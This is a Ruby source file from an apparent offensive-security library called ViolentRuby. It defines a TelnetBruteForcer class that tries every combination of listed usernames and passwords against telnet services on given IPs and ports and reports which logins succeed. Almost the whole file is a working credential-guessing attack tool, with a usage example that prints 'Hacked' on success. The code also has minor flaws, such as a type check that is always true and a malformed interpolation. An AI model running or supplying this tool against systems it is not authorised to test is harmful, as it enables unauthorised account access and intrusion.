require 'net/telnet'

module ViolentRuby
  # TelnetBruteForcer can be used to brute force telnet connections.
  # It can give out false-positives as 'net/telnet' login method depends
  # on seeing the strings 'username' and 'password' to supply the creds. 
  # In case the server doesn't give out those strings, this will fail.
  #
  # Author: Gr3a7Wh173 
  # Author: Picat 
  #
  # Usage:
  # require 'violent_ruby'
  # t = ViolentRuby::TelnetBruteForcer.new
  #
  # telnet = ViolentRuby::TelnetBruteForcer.new(users: "ubuntu", 
  #                                             passwords: ['password', 'ubuntu','password123'], 
  #                                             ips: "10.0.0.31", 
  #                                             ports: 23)
  # telnet.brute_force do |result|
  #   case result[:type]
  #   when :success
  #     puts "Hacked #{result[:ip]:result[:port]}"
  #   when :failure
  #     puts "Not hacked yet. lol"
  #   end
  # end
  #
  class TelnetBruteForcer

    # @attr [Array] users array of usernames
    attr_accessor :users
    # @attr [Array] passwords array of passwords
    attr_accessor :passwords
    # @attr [Array] ips array of IP addresses
    attr_accessor :ips
    # @attr [Array] ports array of ports
    attr_accessor :ports

    # Initializes the TelnetBruteForcer
    #
    # @param users     [String,Array,File] Users to use.
    # @param passwords [String,Integer,Array,File] Passwords to use.
    # @param ips       [String,Array,File] IP Addresses to use.
    # @param ports     [String,Integer,Array,File] Ports to use.
    # @param timeout   [Integer] Timeout value to use.
    def initialize(users:, passwords:, ips:, ports:, timeout: 2)
      @users 		 = users
      @passwords = passwords
      @ips 			 = ips
      @ports 		 = ports
      @timeout   = timeout # seconds
    end

    # Start the brute force attack
    def brute_force
      capture_results do |results|
        enum(@ips) do |ip|
          enum(@ports) do |port|
            enum(@users) do |user|
              enum(@passwords) do |password|
                if able_to_login? ip: ip, port: port, user: user, password: password
                  result = format_result(type: :success, ip: ip, port: port, user: user, password: password)
                else
                  result = format_result(type: :failure, ip: ip, port: port, user: user, password: password)
                end
                results << result
                yield result if block_given?
              end
            end
          end
        end
      end
    end

    # Check if we can login
    def able_to_login?(ip:, port:, user:, password:, timeout: @timeout)
      begin
        telnet = Net::Telnet::new("Host" => ip, "Port" => port, "Timeout"=>@timeout)
        telnet.login(user, password)
        return true
      rescue
        return false
      end
    end

    alias brute_force! brute_force

    private

    # @api private
    # Enumerate over a given object in a fluid manner.
    def enum(arg)
      if arg.is_a? Array
        arg.each { |arg| yield arg.strip }
      elsif arg.is_a? String or Integer
        yield arg
      elsif arg.is_a? File
        File.open(arg, "r").each_line { |line| yield line.strip }
      else
        raise ArgumentError, "Argument must be a array, string, integer, or file."
      end
    end

    # @api private
    # Yield'aself a lil a lil array with'a block mate.
    def capture_results
      array = Array.new
      yield array
      return array
    end

    # @api private
    # Format the result in our desired form
    def format_result(type:, ip:, port:, user:, password:)
      { time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
    end
  end
end
